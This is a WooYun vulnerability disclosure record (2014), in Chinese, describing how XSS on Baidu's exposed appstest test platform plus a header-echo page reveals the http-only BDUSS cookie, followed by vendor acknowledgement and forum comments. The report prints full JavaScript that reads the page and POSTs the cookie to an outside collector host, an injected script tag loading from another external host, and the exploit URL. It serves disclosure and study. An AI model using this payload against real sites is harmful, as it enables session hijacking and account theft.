{"id": 4985, "wybug_id": "wooyun-2014-051705", "wybug_title": "我是如何通过XSS窃取到百度受http-only保护的cookie的", "wybug_corp": "百度", "wybug_author": "超威蓝猫", "wybug_date": "2014-02-22 18:15", "wybug_open_date": "2014-04-08 18:15", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-08：\t细节向公众公开  简要描述： BDUSS受http-only保护? 看我如何窃取到完整的cookie。 详细说明：  问题出在一个小漏洞上。\nhttp://appstest.baidu.com/\n百度移动客户端测试资源平台对外。上周提交到乌云的漏洞可能是因为审核员比较忙没有审核，这周我们来深挖一下。\n\n\nhttp://appstest.baidu.com/http/echoheader.php\n该测试页返回了完整的http头，其中也包括了完整的cookie。混贴吧圈的应该都知道BDUSS是最关键的字段，同时该字段是受http-only保护的，百度SRC之前也因此下调了XSS的评分标准。\n\n这样，我们只要利用XSS平台的\"指定页面源码读取\"模块即可通过XSS获取用户的完整cookie。该模块代码如下:\nvar u = 'http://buv.me/index.php?do=api&id={projectId}';var cr;if (document.charset) {    cr = document.charset} else if (document.characterSet) {    cr = document.characterSet};function createXmlHttp() {    if (window.XMLHttpRequest) {        xmlHttp = new XMLHttpRequest()    } else {        var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');        for (var n = 0; n < MSXML.length; n++) {            try {                xmlHttp = new ActiveXObject(MSXML[n]);                break            } catch(e) {}        }    }}createXmlHttp();xmlHttp.onreadystatechange = writeSource;xmlHttp.open(\"GET\", \"http://appstest.baidu.com/http/echoheader.php\", true);xmlHttp.send(null); \tfunction postSource(cc) {    createXmlHttp();    url = u;    cc = \"mycode=\" + cc;    xmlHttp.open(\"POST\", url, true);    xmlHttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");    xmlHttp.setRequestHeader(\"Content-length\", cc.length);    xmlHttp.setRequestHeader(\"Connection\", \"close\");    xmlHttp.send(cc)}function writeSource() {    if (xmlHttp.readyState == 4) {        var c = new postSource(xmlHttp.responseText)    }}\n由于是用xmlHttpRequest的形式读源码，且 http://appstest.baidu.com/ 的 Access-Control-Allow-Origin 为空，即默认不允许跨域，所以我们必须在同域下才能用xmlHttpRequest获取到完整的cookie。我在 http://wooyun.org/bugs/wooyun-2014-051026/trace/e80c9b4ecb9c252d6bdfdb21c335164d 中有提到， http://appstest.baidu.com/abnormalTest/abnormaTest.php?typeName=single 可以自由构造XSS。我们向该页面写入如下代码:\n<title>wooyun.org</title><p>超威蓝猫@wooyun.org</p><script src=http://00f.me/XbSWCk></script>\n成功窃取到包含BDUSS的完整cookie:\n\nXSS收信平台收到了cookie:\n\n最终的利用地址:http://appstest.baidu.com/abnormalTest/abnormaTest.php?typeName=single   漏洞证明：  如上。   修复方案：  最关键的一点：测试用的后台不要对外。另外 求份礼物(不要再发加湿器了..   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-02-22 19:14 厂商回复： 感谢提交，我们立即联系业务部门处理此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-22 18:16 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  我是如何回复这个帖子的...    \n     2014-02-22 18:17 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  羞愧难当    \n     2014-02-22 18:18 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @xsser 之前我15号提交的那个漏洞还是不要通过审核吧，和这个一样..    \n     2014-02-22 19:06 |    \t\tRicter \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 渣渣一个)\t\t \n  大神！！    \n     2014-02-22 19:25 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  度娘的bduss漏洞百出。。httponly形同虚设    \n     2014-02-22 19:26 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @dtc 屌!= =    \n     2014-02-22 22:06 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  这么说我的端口又得换了？    \n     2014-02-22 22:07 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @retaker 这位retaker是当年点艹猴子团小擦的retaker吗    \n     2014-02-22 23:11 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  @超威蓝猫 - =小擦是谁？我只是在百度贴吧蠕过3次而已……    \n     2014-02-23 11:26 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  碉堡    \n     2014-03-18 01:06 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  洞主得多少加湿器了    \n     2014-04-08 20:38 |    \t\t奔跑的蜗牛 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 要想看好风景得上高处！成为一名优秀的白帽...)\t\t \n  小菜有问题想请教楼主，在IE下，xmlhttprequest发送数据不成功怎么回事，创建xmlhttprequest对象和你的一样啊！！我用的的post方式发送，但是始终得不到数据。。。。。    \n     2014-04-08 20:55 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @奔跑的蜗牛 不清楚..    \n     2014-04-08 21:14 |    \t\t奔跑的蜗牛 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 要想看好风景得上高处！成为一名优秀的白帽...)\t\t \n  @超威蓝猫 你的上面这段代码，ie测试下可以么？？难道是我的环境哪里限制了？？这几天都在折腾这问题，蛋疼啊！！    \n     2014-04-09 09:06 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  ╮(╯_╰)╭所以说这页面是怎么找到的..    \n     2014-04-09 10:13 |    \t\tw5r2 \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:52        )\t\t \n  @奔跑的蜗牛 用google浏览器    \n     2014-04-09 10:15 |    \t\t奔跑的蜗牛 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 要想看好风景得上高处！成为一名优秀的白帽...)\t\t \n  @w5r2 在谷歌浏览器和火狐都可以发送成功，但是就是在ie下不行，我在创建xmlhttprequest对象时，有判断是否创建成功，理论上ie下的对象是有创建的，但是就是发送不成功！！    \n     2014-04-09 10:40 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  @奔跑的蜗牛 setRequestHeader写了么?    \n     2014-04-09 10:58 |    \t\t奔跑的蜗牛 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 要想看好风景得上高处！成为一名优秀的白帽...)\t\t \n  @QQ852451559 额，写了就跟lz那个postSource函数里头的设置一致    \n     2014-04-09 11:02 |    \t\tlupin \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:48        | 尊重自己的爱好 远离利益的罪恶)\t\t \n  学习了 很好的思路    \n     2014-08-15 15:25 |    \t\tlatershow \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | andr0day)\t\t \n  学习了    \n     2015-04-26 15:37 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  洞主加湿器不要就给我吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}